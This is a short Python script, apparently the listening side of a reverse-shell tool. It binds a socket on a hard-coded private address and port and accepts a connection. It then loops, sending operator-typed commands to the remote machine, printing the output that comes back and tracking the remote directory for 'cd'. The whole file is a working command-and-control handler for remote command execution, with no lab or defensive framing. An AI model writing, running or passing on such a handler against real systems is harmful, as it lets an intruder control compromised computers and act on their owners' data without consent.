import socket
import math

def create_socket(ip, port):
    sock = socket.socket()
    sock.bind((ip,port))
    sock.listen(5)
    return sock

def connect(sock):
    s, address = sock.accept()
    return s, address

def send(s, text):
    s.send(bytes(text + "\n", "utf-8"))

def recv(s, buffer):
    buffer = s.recv(32).decode("utf-8").replace("buffer: ", "")
    
    buffer = int(buffer) + 1
    send(s, "ok")
    times_to_recieve = buffer / 1024

    output = ""
    print("number of times to recieve "+ str(math.ceil(times_to_recieve)))
    for a in range(0, math.ceil(times_to_recieve)):
        print("reciving: " + str(a))
        output = output + s.recv(buffer).decode("utf-8")
    return output

def cd(cmd, output, client):
    currentpath = output.replace("currentpath:", "")
    currentpath = currentpath.split("/")

    newpath = ""
    if cmd.replace("cd ", "") == "..":
        currentpath = currentpath[:-1]
        
        for a in currentpath:
            if a != "":
                newpath = newpath + "/" + a
        newpath = newpath.replace("/ ","")
    
    else:
        currentpath[-1] = currentpath[-1][:-1]
        
        for a in currentpath:
            if a != "":
                newpath = newpath + "/" + a
        newpath = newpath +"/"+cmd.replace("cd ","")
        newpath = newpath.replace("/ ","")
    return newpath

sock = create_socket("10.9.11.18",4422)
client, address = connect(sock)

print(recv(client, 16))
send(client,"hey sup")


while True:

    cmd = input("cmd -> ")

    send(client,cmd)
    output = (recv(client,1025))


    if output.startswith("currentpath:") and cmd.startswith("cd "):

        newpath = cd(cmd,output, client) 
        send(client, "newpath:" + newpath)

        output = recv(client,1024)

    print(output)